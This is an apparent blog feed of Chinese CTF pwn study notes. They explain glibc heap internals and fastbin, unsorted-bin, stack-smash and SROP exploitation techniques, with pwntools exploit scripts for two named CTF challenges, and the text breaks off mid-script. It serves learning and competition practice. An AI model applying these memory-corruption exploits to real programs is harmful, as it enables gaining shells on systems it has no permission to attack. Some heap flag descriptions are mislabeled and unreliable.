    <content type="html"><![CDATA[<h1 id="三种典型的可以利用fastbin-attack的漏洞"><a href="#三种典型的可以利用fastbin-attack的漏洞" class="headerlink" title="三种典型的可以利用fastbin attack的漏洞"></a>三种典型的可以利用fastbin attack的漏洞</h1><h2 id="1-double-free"><a href="#1-double-free" class="headerlink" title="1.double free"></a>1.double free</h2><p> 当程序有double free漏洞时，可以通过申请两个fastbin大小的堆块1和2，以0x30举例，然后分别释放chunk1和chunk2，fastbin的结构如下图</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330200816347.png" alt="image-20230330200816347"></p><p>这时由于有double free漏洞，再释放chunk 1，链表就会变成这样一个循环链表：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330200856044.png" alt="image-20230330200856044"></p><p>表头指向chunk1，chunk1指向chunk2，chunk2又指回chunk1。那么这时按照如下步骤：</p><ul><li><p>申请一个new chunk 1：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330200951335.png" alt="image-20230330200951335"></p></li><li><p>将new chunk 1中的内容修改为要修改的地址（-0x10以上）：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330201125670.png" alt="image-20230330201125670"></p></li><li><p>申请一个new chunk 2：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330201150656.png" alt="image-20230330201150656"></p><ul><li>再申请一个new chunk 3（new chunk 3是和new chunk 1重合的）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330201248302.png" alt="image-20230330201248302"></p><ul><li><p>这时可以发现，fastbin链表已经指向了我们想要修改的地址了，只要再申请一个堆块就会申请到想要修改的地址，然后只要编辑这个堆块便可完成任意地址写。</p></li><li><p><strong>总结：</strong>总的来说要利用double free的漏洞就是要有两个指针指向同一个chunk，这样就可以利用一个指针对chunk的内容做修改，另外一个指针（也就是fastbin的表头）指向该chunk时就会认为其中内容为fd（也就是下一个堆块的地址，但是该地址是我们认为修改的），我们再申请chunk那么fastbin表头就会指向我们填充的那个地址，这样也就等于是生成了一个假的chunk。</p><h2 id="2-chunk-extend"><a href="#2-chunk-extend" class="headerlink" title="2.chunk extend"></a>2.chunk extend</h2><p>chunk extend是一种限制比较少的堆利用方式，通常通过off by one或off by null或者其他堆溢出来利用。</p><p>chuank extend利用需要的条件是：</p><ol><li>可以进行堆布局</li><li>可以溢出至少一个字节</li></ol><p>chunk extend的原理是，首先申请三个堆块：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330211230607.png" alt="image-20230330211230607"></p><p>这里size 0x18是堆块的大小，1是前一个堆块占用位，先通过编辑堆块A然后通过off by one来溢出到堆块B的size域，并将其修改为0x18+0x18+1（其实就是size B+size C，然后前一个堆块占用1）：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330214201801.png" alt="image-20230330214201801"></p><p>这时释放堆块B，由于大小在fastbins中，所以（堆块C的）下一个堆块的前一个堆块使用位不会被置0，再释放C，arena中对应的bins就会指向B和C，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330214223009.png" alt="image-20230330214223009"></p><p>然后再申请一个大小为0x20的堆块，将C申请回来，这时bins就会指向freegot，接下来再申请空间就会申请到freegot了：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230330214252629.png" alt="image-20230330214252629"></p><p>再次申请一个0x20大小的堆块就会申请到free_got所在的地方，这时就可以修改为任意的值了。</p><ul><li><p><strong>总结：该方法利用堆溢出的方法来修改下一个堆的size位使得下一个chunk的大小可以覆盖下下个chunk，然后在其中写入内容，从而达到可以污染下下个chunk的fd位的目的。</strong>总得来说与double free非常类似最后同样是让两个指针指向同一个chunk，一个指针申请回来使我们可以修改chunk中的内容（任意地址），让fastbin可以指向我们所写的任意地址。</p><h2 id="3-use-after-free"><a href="#3-use-after-free" class="headerlink" title="3.use after  free"></a>3.use after  free</h2><p>use after free来利用fastbin attack也非常简单。首先，申请一个对应fastbin区间内的堆块并释放：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230401121355074.png" alt="image-20230401121355074"></p><p>接着利用use after free将这个已释放堆块的指针域修改，修改为想要修改的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230401121850562.png" alt="image-20230401121850562"></p><p>然后和double free的后半段类似，再申请两个堆块便可申请到想要修改的地址处，之后编辑即可。</p><p><strong>总结：</strong>UAF的原理也就是在申请堆然后释放该堆但是却没有把指向该堆的指针置零，导致出现浮空指针，很容易的就出现了两个指针指向同一个堆的情况</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>unsorted_bin_attack</title>
    <link href="/2024/05/04/unsorted-bin-attack/"/>
    <url>/2024/05/04/unsorted-bin-attack/</url>
    
    <content type="html"><![CDATA[<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p>关于这个手法的学习，必须要搞清楚两件事，不然理解起来挺懵的。<br>第一、从unsorted bin中取堆块的时候，是从尾部取的堆块。</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240401202036954.png" alt="image-20240401202036954"></p><p>上图变为结构图为：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240401202756914.png" alt="image-20240401202756914"></p><p>当从unsorted bin中拿取最后一个堆块时（unsorted bin中堆块是从最后一个取的，跟fastbin和tcachebin还不一样），会触发下面这部分的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">victim = <span class="hljs-built_in">unsorted_chunks</span> (av)-&gt;bk<br>bck = victim-&gt;bk<br><span class="hljs-built_in">unsorted_chunks</span> (av)-&gt;bk = bck<br>bck-&gt;fd = <span class="hljs-built_in">unsorted_chunks</span> (av)<br></code></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">victim = <span class="hljs-built_in">unsorted_chunks</span> (av)-&gt;bk<br>这个就是说把main_arena（这里的main_arena我的指的是上图的那个main_arena bins[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]这个块)的bk指针指向的内容（也就是chunk3的地址）给victim<br>换言之，这行代码的意思就是说victim就是chunk3<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">bck = victim-&gt;bk<br>这个就是把chu<span class="hljs-symbol">nk3</span>的bk指针指向的内容（也就是chu<span class="hljs-symbol">nk2</span>)给bck<br>换言之，这行代码的意思就是说bck就是chu<span class="hljs-symbol">nk2</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">unsorted_chunks <span class="hljs-function"><span class="hljs-params">(av)</span>-&gt;</span>bk = bck<br>这个就是把现在的chunk2地址给main_arena的bk指针<br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = unsorted_chunks (av)<br>这个就是把main_arena的地址给bck（也就是chunk2)的fd指针<br></code></pre></td></tr></table></figure><p>从上面的分析可以看出，在执行完这串代码之后，chunk3从unsorted bin中分离了出去。</p><p>这四步中，我们可以从第二步进行攻击，如果我们可以利用溢出来伪造这个bck(也就是victim-&gt;bk，<strong>大白话就是用溢出unsorted bin中的尾部的chunk的bk指针（fd指针无所谓）</strong>），这就意味着我们可以将unsorted_chunks (av)(这个也就是main_arena+88&#x2F;96的地址)写入到我们伪造的chunk的bck-&gt;fd(也就是bck+0x10)中。<strong>如果我们将伪造的地址先-0x10，那么最后这个伪造的地址就会被写入main_arena+88或main_arena+96的地址。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">注意：由于执行完unsorted <span class="hljs-built_in">bin</span> attack 后的chunk2已经变成了一个libc中的地址（应该是main_arena+<span class="hljs-number">88</span>的地址），接下来再从unsorted <span class="hljs-built_in">bin</span>中申请堆块时，执行bck-&gt;fd这步试图往libc这个不可写的地址写入数据，而导致程序崩溃。所以unosrtedbin attack之后，无法再从unsorted <span class="hljs-built_in">bin</span>中申请堆块了<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>heap</title>
    <link href="/2024/05/04/heap%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/05/04/heap%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="mmp函数：将硬盘上的一块区域映射为虚拟内存"><a href="#mmp函数：将硬盘上的一块区域映射为虚拟内存" class="headerlink" title="mmp函数：将硬盘上的一块区域映射为虚拟内存"></a>mmp函数：将硬盘上的一块区域映射为虚拟内存</h1><p>void *mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset); 创建共享内存映射<br>参数：<br>addr： 指定映射区的首地址。通常传NULL，表示让系统自动分配<br> length：共享内存映射区的大小。（&lt;&#x3D; 文件的实际大小，通常为文件大小）<br> prot： 共享内存映射区的读写属性。PROT_READ（读）、PROT_WRITE（写）、PROT_READ|PROT_WRITE（读写）<br> flags： 标注共享内存的共享属性。<br> MAP_SHARED（共享，会将映射区所做的操作反映到物理设备（磁盘）上。）<br> MAP_PRIVATE（私有，映射区所做的修改不会反映到物理设备。 ）<br> fd: 用于创建共享内存映射区的那个文件的 文件描述符。<br> offset：默认0，表示映射文件全部。偏移位置。需是 4k 的整数倍。<br>返回值：<br> 成功：映射区的首地址。<br> 失败：MAP_FAILED (void(-1))， errno</p><h1 id="堆的大小对齐"><a href="#堆的大小对齐" class="headerlink" title="堆的大小对齐"></a>堆的大小对齐</h1><p>堆的大小必须是2<em>SIZE_SZ的整数倍，如果申请的内存大小不是2</em>SIZE_SE的整数倍；32位系统中，SIZE_SE&#x3D;4,64位系统中SIZE_SE&#x3D;8;<strong>也就是32位系统堆大小为8的倍数，64位系统堆大小为16的倍数</strong>，8对应的2进制为1000，所以不管size如何变化对应的低3位固定位0；为了不浪费这3个比特位，它们从高到低分别被用来表示：</p><h2 id="A-flag"><a href="#A-flag" class="headerlink" title="A flag"></a>A flag</h2><p>NON_MIAN_ARENA,记录当前chunk是否不属于主线程，1表示不属于，0表示属于。</p><h2 id="P-flag"><a href="#P-flag" class="headerlink" title="P flag"></a>P flag</h2><p>IS_MAPPED,记录当前chunk是否是由mmap分配的。一般来说，堆中第一个被分配的内存块的size字段的p位都会被设置为1，以便于防止访问前面的非法内存。当一个chunk的size的p位为0时，我们能通过prev_size字段来获取上一个chunk的大小以及地址。这也方便进行空闲chunk之间的合并。</p><h2 id="M-flag"><a href="#M-flag" class="headerlink" title="M flag"></a>M flag</h2><p>PREV_INUSE,记录前一个chunk块是否被分配。 </p><h1 id="prev-size"><a href="#prev-size" class="headerlink" title="prev_size"></a>prev_size</h1><p>若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于储存前一个chunk的数据</p><h1 id="size"><a href="#size" class="headerlink" title="size"></a>size</h1><p>用于表示当前chunk的大小（整个chunk的大小，包括chunk头）<!--prev_size与size组成了chunk头。32位4字节，64位8字节（size位）--></p><h1 id="fd-pointer"><a href="#fd-pointer" class="headerlink" title="fd pointer"></a>fd pointer</h1><p>在bin中指向下一个（非物理相邻）空闲的chunk（chunk被分配后从fd开始是用户的数据）</p><h1 id="bk-pointer"><a href="#bk-pointer" class="headerlink" title="bk pointer"></a>bk pointer</h1><p>在bin中指向上一个（非物理相邻）空闲的chunk</p><h1 id="fd-nextsize"><a href="#fd-nextsize" class="headerlink" title="fd_nextsize"></a>fd_nextsize</h1><p>在large bin中指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针</p><h1 id="bk-nextsize"><a href="#bk-nextsize" class="headerlink" title="bk_nextsize"></a>bk_nextsize</h1><p>在large bin中指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针 <!--bk_nextsize与fd_nextsize是large bin中特有的--></p><h1 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h1><table><thead><tr><th align="center">prev_size</th></tr></thead><tbody><tr><td align="center">size        |   A  flag  |   M flag   |   P flag   |</td></tr><tr><td align="center">fd_pointer （未被分配时，被分配则为用户数据的开始）</td></tr><tr><td align="center">bk_pointer</td></tr><tr><td align="center">fd_nextsize</td></tr><tr><td align="center">bk_nextsize</td></tr><tr><td align="center">……….</td></tr></tbody></table><h1 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h1><p>管理arena中空闲chunk的结构，以数组的形式存在，数组元素为对应大小的chunk链表的链表头，存在于arena的malloc_state中。</p><ol><li>unsorted bin （队尾取chunk）</li><li>fast bin </li><li>small bins</li><li>large bins</li><li>(tcache)glibc-2.27</li></ol><h2 id="1-fast-bins单向链表（先进后出）"><a href="#1-fast-bins单向链表（先进后出）" class="headerlink" title="1.fast bins单向链表（先进后出）"></a>1.fast bins单向链表（先进后出）</h2><ul><li>LIFO</li><li>管理16、24、32、40、48、56、64Bytes 的 free chunks（32位下默认）</li><li>其中的chunk的in_use位（下一个物理相邻的chunk的p位）总是为1</li></ul><h2 id="2-unsorted-bin"><a href="#2-unsorted-bin" class="headerlink" title="2.unsorted bin"></a>2.unsorted bin</h2><ul><li>bin[1]</li><li>双向链表</li><li>管理刚刚释放还未分类的chunk</li><li>可以视为空闲chunk回归其所属bin之前的缓冲区</li><li><code>unsorted bin</code>的特性，若<code>unsorted bin</code>中只有一个chunk的时候，这个chunk的fd和bk指针存放的都是<code>main_arena+88</code>或者main_arena+96，通过<code>main_arena</code>我们就可以获取到libc的基地址。</li></ul><h2 id="3-small-bins"><a href="#3-small-bins" class="headerlink" title="3.small bins"></a>3.small bins</h2><ul><li>bins[2]~bins[63]</li><li>62个循环双向链表</li><li>FIFO</li><li>管理16、24、32、40、…….、504Bytes的free chunk（32位以下）</li><li>每个链表中储存的chunk大小都一致</li></ul><h2 id="4-larg-bins"><a href="#4-larg-bins" class="headerlink" title="4.larg bins"></a>4.larg bins</h2><ul><li>bins[64]~bins[126]</li><li>63个循环双向链表</li><li>FIFO</li><li>管理大于504Bytes的free chunks(32位以下)</li><li>每个链表储存的chunk大小不一定相同</li></ul><h2 id="5-tcache-bin（先进后出）"><a href="#5-tcache-bin（先进后出）" class="headerlink" title="5.tcache bin（先进后出）"></a>5.tcache bin（先进后出）</h2><ul><li>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块。无须对arena上锁既可以使用，所以采用这种机制后分配算法有不错的性能提升。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。<br>另外tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，<strong>前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量</strong>，从0x20开始到0x410结束，刚好64条链，然后<strong>剩下的每8字节记录一条tcache bin链的开头地址</strong>，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。</li><li>libc2.26以前的libc是没有该机制的。</li></ul><h1 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h1><ul><li>它根据用户申请的内存块大小以及相应大小的chunk通常使用的频度（fastbin chunk,small chunk,large chunk）,依次实现了不同的分配方法。</li><li>它由小到达依次检查不同的bin中是否有相应的空闲块可以满足用户的请求的内存。</li><li>当所有的空闲chunk都无法满足时，它会考虑top chunk。当top chunk也无法满足时，堆分配器才会进行内存块申请。</li></ul><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><ul><li>它会将用户暂且不用的chunk回收给堆管理器，适当的时候还会归还给操作系统。</li><li>它依据chunk的大小来优先试图将free chunk链入teache或者是fast bin。不满足则链入unsorted bin中。</li><li>在条件满足时free函数遍历usorted bin并将其中的物理相邻的free chunk合并，将相应大小的chunk分类放入small bin或者large bin中。</li><li>除了tcache chunk与fast bin chunk，其他chunk在free时会与其物理相邻的free chunk合并。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stack_Smach</title>
    <link href="/2024/05/04/stack-Smach/"/>
    <url>/2024/05/04/stack-Smach/</url>
    
    <content type="html"><![CDATA[<h1 id="stack-smach"><a href="#stack-smach" class="headerlink" title="stack smach"></a>stack smach</h1><p>​      这类型的题目通常会存在通常会存在canary保护，因为这是利用canary的报错时会程序会执__stack_chk_fail 函数来打印 __libc_argv[0] 指针所指向的字符串（默认存储的是程序的名称），我们就可以通过栈溢出来覆盖到 __libc_argv[0] 为我们想要泄漏的地址，就能泄露对应的内容。</p><p>例题（nssctf easyecho）</p><p>首先检查保护</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230721194033363.png" alt="image-20230721194033363"></p><p>保护全开</p><p>进行动态调试，先把断点下到第四个printf（偏移为0xB2E）处</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230721194252940.png" alt="image-20230721194252940"></p><p>发现栈上存在一个push rbx命令的地址，那么我们可以在这个地址前面的栈空间里面填满内容，这样就可以通过接下来代码中的%s来泄露这串地址，泄露了这串地址我们就可以得知这一内存页的基地址即（leak addr-0xcf0），有了基地址，而在ida中可以查看每行命令的偏移量，那就可以做到泄露出存放flag的地址即（leak addr - 0xcf0 + 0x202040）</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230721194711910.png" alt="image-20230721194711910"></p><p>可以通过调试得出从输入口到文件名字位置的偏移量为0x168从而可以把canary报错时出现的文件名替换为flag位置，从而泄露flag，当然最后必须要保证整个程序可以成功的return，不然也不会出现报错。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sal</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28782)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>sal(<span class="hljs-string">b&#x27;Name: &#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>rl(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pro_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>sal(<span class="hljs-string">b&#x27;Input: &#x27;</span>, <span class="hljs-string">b&#x27;backdoor\x00&#x27;</span>)<br>flag_addr = pro_base + <span class="hljs-number">0x202040</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr)<br>sal(<span class="hljs-string">b&#x27;Input: &#x27;</span>, payload)<br>sal(<span class="hljs-string">b&#x27;Input: &#x27;</span>, <span class="hljs-string">b&#x27;exitexit&#x27;</span>)<br>r()<br>r()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2024/05/04/SROP/"/>
    <url>/2024/05/04/SROP/</url>
    
    <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>SROP（Sigreturn Oriented Programming）利用了linux下15号系统调用的-&gt;<strong>rt_sigreturn</strong></p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p><strong>Signal</strong>是<strong>Unix</strong>系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息常见于在一个进程中，内核向其发送软中断信号，该进程将暂时被挂起，系统进入内核态因为是暂时被挂起，所以系统会保留该进程的上下文 。即将所有的寄存器压入栈中，以及signal信息和<strong>指向sigreturn的系统调用地址</strong>在栈顶上放置<strong>rt_sigreturn</strong>。（这些信息也就是该进程的上下文，我们称为<strong>Signal Frame</strong>）</p><p>接下来用一张流程图来进行更好的理解：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230811154419097.png" alt="image-20230811154419097"></p><ol><li>用户态进程接收到别的进程发送的信号signal，该进程被挂起，进入内核态。</li><li>内核保存用户态进程的上下文，然后跳转到用户态的信号对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户态进程栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再压指向rt_sigreturn的返回地址。</li><li>用户态的信号处理程序执行完毕，<strong>pop返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。</strong>内核根据<strong>之前栈上的Signal Frame完成用户态进程上下文的恢复</strong>。</li><li>返回用户态，并且按照恢复的上下文继续执行。</li></ol><p>那么关键就在于第三步中的进行sigreturn的系统调用，然后依据栈上保存的Signal Frame来进行进程的上下文恢复，而我们从第二步可以知道Signal Frame是保存用户态的栈上的，那么这就以为着我们是可以对其进行伪造的，伪造好Signal Frame之后只需要进行sigreturn系统调用，那么进程的上下文就会变成我们所伪造的Signal Frame的内容。从而获取shell权限。</p><h2 id="例题：-CISCN-2019华南-PWN3"><a href="#例题：-CISCN-2019华南-PWN3" class="headerlink" title="例题：[CISCN 2019华南]PWN3"></a>例题：[CISCN 2019华南]PWN3</h2><p>使用IDA进行反编译</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230811165551522.png" alt="image-20230811165551522"></p><p>当发现存在<strong>mov   rax，0xF</strong>的时候就应该想到SROP（15是sigreturn的系统调用号）</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230811172428455.png" alt="image-20230811172428455"></p><p>首先进行第一次栈溢出，为下一次溢出做准备的同时，泄露出栈的地址；</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230811174556213.png" alt="image-20230811174556213"></p><p>然后伪造sigframe;</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230811174653122.png" alt="image-20230811174653122"></p><p>最后写入&#x2F;bin&#x2F;sh，并且将返回地址覆盖为mov   rax，0xF的gadget，然后进行系统调用，同时把伪造的sigframe也加入栈中。</p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28564</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>syscall = <span class="hljs-number">0x400517</span><br>rax_15 = <span class="hljs-number">0x4004DA</span><br><br><span class="hljs-comment">#leak stack</span><br>s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x4004F1</span>))<br>stack = get_addr()<br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">59</span><br>sigframe.rdi = stack - <span class="hljs-number">0x110</span><br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rip = syscall<br><br>s(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + 